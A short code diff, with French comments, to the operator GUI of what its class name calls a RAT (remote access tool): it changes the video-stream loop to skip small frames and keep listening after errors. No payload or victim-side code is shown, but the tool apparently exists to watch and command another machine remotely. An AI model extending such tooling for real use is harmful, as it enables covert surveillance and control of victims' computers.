@@ -82,18 +82,15 @@ class RATGUI(ctk.CTk):
             while True:
                 try:
                     data = receive_base64(self.video_socket)
-                    print(">> Frame reçue :", len(data), "octets")
-                    if data:
-                        try:
-                            img = Image.open(io.BytesIO(data)).resize((self.stream_w, self.stream_h))
-                            photo = ImageTk.PhotoImage(img)
-                            self.image_label.configure(image=photo)
-                            self.image_label.image = photo
-                        except Exception as e:
-                            self.log(f"[Erreur affichage image] {e}")
+                    if not data or len(data) < 1000:
+                        continue
+                    img = Image.open(io.BytesIO(data)).resize((self.stream_w, self.stream_h))
+                    photo = ImageTk.PhotoImage(img)
+                    self.image_label.configure(image=photo)
+                    self.image_label.image = photo
                 except Exception as e:
                     self.log(f"[Erreur stream vidéo] {e}")
-                    break
+                    continue  # Continue à écouter
         threading.Thread(target=stream, daemon=True).start()
 
     def send_command(self, cmd):
